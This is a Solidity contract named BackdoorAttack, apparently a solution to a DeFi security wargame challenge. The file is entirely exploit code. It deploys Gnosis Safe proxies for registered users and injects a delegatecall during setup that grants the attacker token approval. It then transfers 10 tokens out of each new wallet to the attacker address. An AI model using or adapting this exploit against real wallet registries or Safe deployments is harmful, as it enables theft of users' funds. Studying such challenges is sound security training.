// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";

interface IGnosisSafeProxyFactor {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract BackdoorAttack {
    address public proxyFactor;
    address public walletRegistry;
    address public gnosisMaster;
    address payable public dtvToken;

    constructor(
        address _proxyFactor,
        address _walletRegistry,
        address _gnosisMaster,
        address payable _dtvToken
    ) {
        proxyFactor = _proxyFactor;
        walletRegistry = _walletRegistry;
        gnosisMaster = _gnosisMaster;
        dtvToken = _dtvToken;
    }

    function approve(address spender, address token) external {
        IERC20(token).approve(spender, 10 ether);
    }

    function attack(
        address _attacker,
        address[] memory users
    ) external {
        for (uint8 i = 0; i < users.length; i++) {
            address[] memory owners = new address[](1);
            owners[0] = users[i];

            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                abi.encodeWithSignature(
                    "approve(address,address)",
                    address(this),
                    dtvToken
                ),
                address(0),
                address(0),
                0,
                address(0)
            );

            GnosisSafeProxy proxy = IGnosisSafeProxyFactor(proxyFactor)
                .createProxyWithCallback(
                    gnosisMaster,
                    initializer,
                    0,
                    IProxyCreationCallback(walletRegistry)
                );

            IERC20(dtvToken).transferFrom(address(proxy), _attacker, 10 ether);
        }
    }

    receive() external payable {}
}
